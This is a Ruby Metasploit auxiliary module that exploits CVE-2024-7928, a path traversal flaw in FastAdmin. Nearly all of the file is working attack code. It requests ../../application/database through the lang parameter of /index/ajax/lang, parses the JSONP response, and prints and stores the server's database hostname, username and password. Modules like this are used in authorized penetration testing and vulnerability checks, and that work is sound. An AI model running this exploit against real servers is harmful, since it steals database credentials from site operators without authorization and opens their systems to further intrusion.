##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'FastAdmin Path Traversal',
      'Description' => %q{
        This module exploits a path traversal vulnerability in FastAdmin versions up to 1.3.3.20220121,
        specifically within the /index/ajax/lang endpoint. By manipulating the `lang` parameter, remote
        attackers can traverse directories and access arbitrary files on the server, such as sensitive
        configuration files including database credentials. This vulnerability, identified as CVE-2024-7928,
        allows unauthenticated access and has been publicly disclosed, making it a viable target for
        exploitation in the wild. The issue is resolved in version 1.3.4.20220530.
      },
      'References' => [
        ['CVE', '2024-7928'],
        ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2024-7928'],
        ['URL', 'https://s4e.io/tools/fastadmin-path-traversal-cve-2024-7928']
      ],
      'Author' => [
        'Rabbit 的个人中心', # Vulnerability discovery
        'bigb0x', # Python script
        'Kazgangap' # Metasploit module
      ],
      'DisclosureDate' => '2024-08-19',
      'License' => MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'Reliability' => []
      }
    ))

    register_options([
      Opt::RPORT(80),
      OptString.new('TARGETURI', [true, 'The base path to FastAdmin instance', '/'])
    ])
  end

  def run_host(ip)
    url = normalize_uri(datastore['TARGETURI'], 'index/ajax/lang?lang=../../application/database')
    begin
      res = send_request_cgi({
        'uri'    => url,
        'method' => 'GET',
        'ssl'    => datastore['SSL']
      })

      unless res && res.code == 200 && res.body.include?('jsonpReturn(')
        print_error("#{ip} is not vulnerable or did not respond as expected.")
        return
      end

      jsonp_match = res.body.match(/jsonpReturn\((.*)\);/)
      unless jsonp_match
        print_error("#{ip} - Failed to find JSONP structure in response body.")
        return
      end

      begin
        data = JSON.parse(jsonp_match[1].strip)
      rescue JSON::ParserError => e
        print_error("#{ip} - Failed to parse JSONP response: #{e.message}")
        return
      end

      unless data['username'] && data['password'] && data['database']
        print_error("#{ip} - Required fields missing in response.")
        return
      end

      print_good("#{ip} is vulnerable!")
      print_good("DB Type   : #{data['type']}")
      print_good("Hostname  : #{data['hostname']}")
      print_good("Database  : #{data['database']}")
      print_good("Username  : #{data['username']}")
      print_good("Password  : #{data['password']}")

      report_note(
        host: ip,
        port: rport,
        type: 'fastadmin.db.info',
        data: data,
        update: :unique_data
      )
    rescue ::Exception => e
      print_error("#{ip} - Error occurred: #{e.message}")
    end
  end
end
